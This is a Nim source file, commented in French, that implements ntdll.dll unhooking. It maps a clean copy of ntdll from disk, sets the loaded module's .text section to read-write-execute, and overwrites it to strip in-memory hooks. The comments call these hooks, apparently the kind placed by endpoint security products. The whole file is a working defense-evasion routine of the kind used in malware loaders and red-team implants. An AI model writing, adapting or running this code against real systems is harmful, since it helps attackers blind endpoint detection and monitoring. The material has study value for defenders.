import winim
import strutils
import ptr_math 
import strformat

# Convertit un tableau de bytes en string
proc toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

# Restaure .text de ntdll.dll chargée en mémoire à partir du disque, true = réussite
proc ntdllunhook(): bool =
    let low: uint16 = 0 # index des sections
    var
        processH = GetCurrentProcess() # Retourne un pseudo-handle (constante système?) vers le processus courant
        mi : MODULEINFO # Contient certaines infos sur le module dont l'adresse
        ntdllModule = GetModuleHandleA("ntdll.dll") # Récupère le Handle ntdll en mémoire
        ntdllBase : LPVOID # Pointeur vers l'adresse de base de ntdll
        ntdllFile : FileHandle # Ouvre le fichier ntdll.dll dans sys32
        ntdllMapping : HANDLE # Le mappe en mémoire = Place son contenu dans la mémoire vive
        ntdllMappingAddress : LPVOID # Pointe vers la version mappée en mémoire
        hookedDosHeader : PIMAGE_DOS_HEADER # Pointeur vers le DOS Header (qui contient e_lfanew)
        hookedNtHeader : PIMAGE_NT_HEADERS # Pointeur vers le NT Header (contient le nombre de sections et leurs adresses)
        hookedSectionHeader : PIMAGE_SECTION_HEADER # Pointeur vers les headers de Sections (on veut restaurer .text)

    # Récupère les infos du module ntdll en mémoire et les place dans mi
    GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))

    # Récupère l'adresse de base de ntdll dans mi
    ntdllBase = mi.lpBaseOfDll

    # Ouvre la version sans hooks sur le disque de ntdll
    ntdllFile = getOsFileHandle(open(r"C:\\windows\\system32\\ntdll.dll", fmread))

    # Le mappe en READONLY comme une image PE pour garantir que les offsets correspondent à ceux en mémoire
    # Les offsets sur le disque ne sont pas les mêmes que ceux en mémoire sans SEC_IMAGE
    ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL)
    if ntdllMapping == 0:
        echo fmt"Could not create file mapping object ({GetLastError()})."
        return false

    # Mappe le fichier en mémoire et donne l'accès à ses sections
    ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
    if ntdllMappingAddress.isNil:
        echo fmt"Could not map view of file ({GetLastError()})."
        return false

    # Le DOS header commence toujours à l'adresse de base
    hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)

    # e_lfanew pointe vers le header NT, donc on le récupère de hookedDosHeader pour trouver NtHeader
    hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)

    # Boucle sur chaque Section du PE 
    for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
        # Avance jusqu'à la première section grâce à IMAGE_FIRST_SECTION 
        # puis avance 'Section' fois de la taille d'une section pour aller à la suivante à chaque boucle
        hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        
        # Une fois la section .text trouvée (généralement la seule hookée) on rentre dans la restauration
        if ".text" in toString(hookedSectionHeader.Name):
            # Sauvegarde l'ancienne protection mémoire puis passe en 0x40 = RWX
            var oldProtection : DWORD = 0
            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:
                echo fmt"Failed calling VirtualProtect ({GetLastError()})."
                return false

            # Copie le code propre depuis le fichier du disque mappé, écrase celui en mémoire
            # les offsets sont identiques grâce à SEC_IMAGE
            copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)

            # Restauration des protections mémoires : RX
            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
                echo fmt"Failed resetting memory back to its original protections ({GetLastError()})."
                return false
    
    # Nettoyage des handles
    CloseHandle(processH)
    CloseHandle(ntdllFile)
    CloseHandle(ntdllMapping)
    CloseHandle(ntdllModule)
    return true
